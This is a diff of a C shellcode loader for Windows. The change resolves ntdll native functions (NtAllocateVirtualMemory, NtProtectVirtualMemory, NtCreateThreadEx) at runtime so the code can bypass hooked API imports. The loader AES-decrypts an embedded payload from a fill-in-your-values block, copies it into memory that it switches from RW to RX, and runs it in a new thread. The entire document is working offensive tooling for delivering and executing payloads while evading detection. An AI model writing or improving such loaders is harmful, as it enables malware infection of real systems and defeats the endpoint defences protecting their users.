@@ -11,25 +11,25 @@
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-// Native API function declarations
-EXTERN_C NTSTATUS NtAllocateVirtualMemory(
+// Typedefs for the Native API functions we need
+typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(
     HANDLE ProcessHandle,
-    PVOID* BaseAddress,
+    PVOID *BaseAddress,
     ULONG_PTR ZeroBits,
     PSIZE_T RegionSize,
     ULONG AllocationType,
     ULONG Protect
 );
 
-EXTERN_C NTSTATUS NtProtectVirtualMemory(
+typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(
     HANDLE ProcessHandle,
-    PVOID* BaseAddress,
+    PVOID *BaseAddress,
     PSIZE_T RegionSize,
     ULONG NewProtect,
     PULONG OldProtect
 );
 
-EXTERN_C NTSTATUS NtCreateThreadEx(
+typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(
     PHANDLE ThreadHandle,
     ACCESS_MASK DesiredAccess,
     PVOID ObjectAttributes,
@@ -43,13 +43,13 @@ EXTERN_C NTSTATUS NtCreateThreadEx(
     PVOID AttributeList
 );
 
-EXTERN_C NTSTATUS NtWaitForSingleObject(
+typedef NTSTATUS(NTAPI *pNtWaitForSingleObject)(
     HANDLE Handle,
     BOOLEAN Alertable,
     PLARGE_INTEGER Timeout
 );
 
-// AES-256-CBC decryption using CryptoAPI (key derived via SHA-256)
+// AES decryption function (unchanged from previous version)
 void DecryptAES(unsigned char* ciphertext, DWORD* pcbData, const unsigned char* key, DWORD keyLen) {
     HCRYPTPROV hProv = 0;
     HCRYPTHASH hHash = 0;
@@ -88,6 +88,25 @@ Cleanup:
 }
 
 int main(void) {
+    // Load ntdll.dll (already loaded, but we get handle anyway)
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtdll) {
+        printf("Failed to get ntdll handle\n");
+        return 1;
+    }
+
+    // Resolve function pointers
+    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    pNtProtectVirtualMemory  NtProtectVirtualMemory  = (pNtProtectVirtualMemory) GetProcAddress(hNtdll, "NtProtectVirtualMemory");
+    pNtCreateThreadEx        NtCreateThreadEx        = (pNtCreateThreadEx)       GetProcAddress(hNtdll, "NtCreateThreadEx");
+    pNtWaitForSingleObject   NtWaitForSingleObject   = (pNtWaitForSingleObject)  GetProcAddress(hNtdll, "NtWaitForSingleObject");
+
+    if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory ||
+        !NtCreateThreadEx || !NtWaitForSingleObject) {
+        printf("Failed to resolve one or more NT functions\n");
+        return 1;
+    }
+
     // ─────────────────────────────────────────────────────────────
     //               PUT YOUR REAL VALUES HERE
     // ─────────────────────────────────────────────────────────────
@@ -101,10 +120,10 @@ int main(void) {
     DWORD payload_len = sizeof(encrypted_shellcode);
     // ─────────────────────────────────────────────────────────────
 
-    PVOID  exec_mem     = NULL;
-    SIZE_T region_size  = payload_len + 0x1000;  // padding for safety
+    PVOID  exec_mem    = NULL;
+    SIZE_T region_size = payload_len + 0x1000;
 
-    // 1. Allocate memory (RW)
+    // 1. Allocate RW memory
     NTSTATUS status = NtAllocateVirtualMemory(
         NtCurrentProcess(),
         &exec_mem,
@@ -119,19 +138,19 @@ int main(void) {
         return 1;
     }
 
-    // 2. Decrypt in-place (modifies encrypted_shellcode buffer)
+    // 2. Decrypt in-place
     DWORD decrypted_len = payload_len;
     DecryptAES(encrypted_shellcode, &decrypted_len, key, sizeof(key));
 
-    if (decrypted_len == 0) {
-        printf("Decryption appears to have failed (length = 0)\n");
+    if (decrypted_len == 0 || decrypted_len > payload_len) {
+        printf("Decryption failed or suspicious length\n");
         return 1;
     }
 
-    // 3. Copy decrypted payload to executable memory
+    // 3. Copy to allocated memory
     memcpy(exec_mem, encrypted_shellcode, decrypted_len);
 
-    // 4. Change protection to RX
+    // 4. Make RX
     ULONG old_protect;
     status = NtProtectVirtualMemory(
         NtCurrentProcess(),
@@ -146,14 +165,14 @@ int main(void) {
         return 2;
     }
 
-    // 5. Create thread at payload entry point
+    // 5. Create thread
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(
         &hThread,
         THREAD_ALL_ACCESS,
         NULL,
         NtCurrentProcess(),
-        exec_mem,           // raw pointer – correct for native API
+        exec_mem,
         NULL,
         FALSE,
         0,
@@ -167,14 +186,12 @@ int main(void) {
         return 3;
     }
 
-    // 6. Wait for thread completion (optional – adjust or remove)
-    LARGE_INTEGER timeout;
-    timeout.QuadPart = -80000000LL;  // -8 seconds
-
+    // 6. Optional: wait (short timeout)
+    LARGE_INTEGER timeout = { .QuadPart = -80000000LL };  // -8 seconds
     NtWaitForSingleObject(hThread, FALSE, &timeout);
 
     CloseHandle(hThread);
 
-    printf("Loader execution finished.\n");
+    printf("Loader finished.\n");
     return 0;
 }
